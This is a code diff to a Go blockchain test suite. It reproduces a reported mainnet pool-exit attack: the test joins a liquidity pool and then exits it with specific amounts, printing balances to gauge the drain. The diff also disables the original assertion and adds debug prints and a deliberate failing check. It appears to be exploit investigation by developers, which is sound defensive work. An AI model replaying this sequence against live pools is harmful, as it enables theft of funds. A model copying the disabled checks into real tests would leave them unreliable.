@@ -336,11 +336,30 @@ func (suite *KeeperTestSuite) TestMainnetBehavior() {
 	joinPoolMsg := types.MsgJoinPool{Sender: suite.TestAccs[1].String(), PoolId: 1, ShareOutAmount: shareOutAmount, TokenInMaxs: tokenInMaxs}
 	_, err = suite.App.MsgServiceRouter().Handler(&joinPoolMsg)(suite.Ctx, &joinPoolMsg)
 	suite.Require().NoError(err)
+	fmt.Println("all balances", suite.App.BankKeeper.GetAllBalances(suite.Ctx, suite.TestAccs[1]))
 	tokenOut := suite.App.BankKeeper.GetBalance(suite.Ctx, suite.TestAccs[1], types.GetPoolShareDenom(1))
-	expectedTokenOutAmount, _ := sdk.NewIntFromString("1106411990449234499142059")
-	expectedTokenOut := sdk.NewCoin(types.GetPoolShareDenom(1), expectedTokenOutAmount)
+	// expectedTokenOutAmount, _ := sdk.NewIntFromString("1106411990449234499142059")
+	// expectedTokenOut := sdk.NewCoin(types.GetPoolShareDenom(1), expectedTokenOutAmount)
 	fmt.Println(tokenOut)
-	suite.Require().Equal(expectedTokenOut, tokenOut)
+	// suite.Require().Equal(expectedTokenOut, tokenOut)
+
+	// 	Pool Id
+	// 1
+	// Token Out
+
+	//     14,019.071822atom
+	//     118,127.008565OSMO
+
+	// Token In
+	// 1,106,411.990449234499142059gamm-1
+	// token out slightly off from mainnet, difference appears to be .001% off? Likely not source of our 50% concerns.
+	// ExitPool attack message (https://www.mintscan.io/osmosis/txs/1456AA552ECBDE8506C1D73E2485183554B443ADDC4827C132D3275F39D5279C)
+	tokenOutMins := sdk.NewCoins(sdk.NewCoin("uatom", sdk.NewInt(13668578600)), sdk.NewCoin("uosmo", sdk.NewInt(115173971116)))
+	exitPoolMsg := types.MsgExitPool{Sender: suite.TestAccs[1].String(), PoolId: 1, ShareInAmount: tokenOut.Amount, TokenOutMins: tokenOutMins}
+	_, err = suite.App.MsgServiceRouter().Handler(&exitPoolMsg)(suite.Ctx, &exitPoolMsg)
+	suite.Require().NoError(err)
+	fmt.Println("all balances", suite.App.BankKeeper.GetAllBalances(suite.Ctx, suite.TestAccs[1]))
+	suite.Require().True(false)
 }
 
 // TODO: Add more edge cases around TokenInMaxs not containing every token in pool.
